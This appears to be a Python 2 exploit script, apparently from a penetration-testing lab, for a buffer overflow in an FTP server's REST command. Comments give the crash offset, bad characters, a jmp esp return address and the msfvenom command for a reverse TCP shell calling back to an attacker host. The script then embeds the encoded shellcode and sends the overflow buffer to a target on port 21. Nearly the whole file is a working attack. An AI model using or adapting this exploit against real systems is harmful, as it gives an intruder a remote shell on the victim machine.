import socket
#with open("pattern.txt","r") as file:
#	buffer=file.read().replace("\r","")
#print len(buffer)
#print buffer
#pattern : 41326941 , pattern offset match at 246
#increase total buffer length to 600 so that "C"'s can occupy min 350 bytes of space
#badchars = \x00 \x0a \x0d
#We use ntpd.dll which had aslr and dep on as we did not find any app with aslr and dep off. we find its jmp esp using : !mona find -s "\xff\xe4" -m ntpd.dll. We find jmp esp at 77CAE871 which is \x71\xe8\xca\x77 in little endian for 32-bit system. Add nops.
#shellcode = msfvenom -p windows/shell_reverse_tcp lhost=10.11.0.52 lport=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -o shellcode.txt
shellcode=("\xdb\xc6\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x52\xbb\x6f\x2f\xd7"
"\xc4\x31\x5a\x17\x03\x5a\x17\x83\xad\x2b\x35\x31\xcd\xdc\x3b"
"\xba\x2d\x1d\x5c\x32\xc8\x2c\x5c\x20\x99\x1f\x6c\x22\xcf\x93"
"\x07\x66\xfb\x20\x65\xaf\x0c\x80\xc0\x89\x23\x11\x78\xe9\x22"
"\x91\x83\x3e\x84\xa8\x4b\x33\xc5\xed\xb6\xbe\x97\xa6\xbd\x6d"
"\x07\xc2\x88\xad\xac\x98\x1d\xb6\x51\x68\x1f\x97\xc4\xe2\x46"
"\x37\xe7\x27\xf3\x7e\xff\x24\x3e\xc8\x74\x9e\xb4\xcb\x5c\xee"
"\x35\x67\xa1\xde\xc7\x79\xe6\xd9\x37\x0c\x1e\x1a\xc5\x17\xe5"
"\x60\x11\x9d\xfd\xc3\xd2\x05\xd9\xf2\x37\xd3\xaa\xf9\xfc\x97"
"\xf4\x1d\x02\x7b\x8f\x1a\x8f\x7a\x5f\xab\xcb\x58\x7b\xf7\x88"
"\xc1\xda\x5d\x7e\xfd\x3c\x3e\xdf\x5b\x37\xd3\x34\xd6\x1a\xbc"
"\xf9\xdb\xa4\x3c\x96\x6c\xd7\x0e\x39\xc7\x7f\x23\xb2\xc1\x78"
"\x44\xe9\xb6\x16\xbb\x12\xc7\x3f\x78\x46\x97\x57\xa9\xe7\x7c"
"\xa7\x56\x32\xd2\xf7\xf8\xed\x93\xa7\xb8\x5d\x7c\xad\x36\x81"
"\x9c\xce\x9c\xaa\x37\x35\x77\xdf\xcc\x35\xb3\xb7\xd0\x35\xba"
"\xfc\x5c\xd3\xd6\x12\x09\x4c\x4f\x8a\x10\x06\xee\x53\x8f\x63"
"\x30\xdf\x3c\x94\xff\x28\x48\x86\x68\xd9\x07\xf4\x3f\xe6\xbd"
"\x90\xdc\x75\x5a\x60\xaa\x65\xf5\x37\xfb\x58\x0c\xdd\x11\xc2"
"\xa6\xc3\xeb\x92\x81\x47\x30\x67\x0f\x46\xb5\xd3\x2b\x58\x03"
"\xdb\x77\x0c\xdb\x8a\x21\xfa\x9d\x64\x80\x54\x74\xda\x4a\x30"
"\x01\x10\x4d\x46\x0e\x7d\x3b\xa6\xbf\x28\x7a\xd9\x70\xbd\x8a"
"\xa2\x6c\x5d\x74\x79\x35\x6d\x3f\x23\x1c\xe6\xe6\xb6\x1c\x6b"
"\x19\x6d\x62\x92\x9a\x87\x1b\x61\x82\xe2\x1e\x2d\x04\x1f\x53"
"\x3e\xe1\x1f\xc0\x3f\x20")
buffer="A"*246 + "\x71\xe8\xca\x77" + "\x90"*24 + shellcode
ip="10.11.20.10"
try:
	print "\n locating eip by crashing with %s bytes" %len(buffer)
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,21))
	s.send("USER anonymous\r\n")
	s.recv(1024)
	s.send("PASS test\r\n")
	s.recv(1024)
	s.send("REST " + buffer + "\r\n")
	s.send("QUIT\r\n")
	s.close()
except:
	print "\nConnection error"
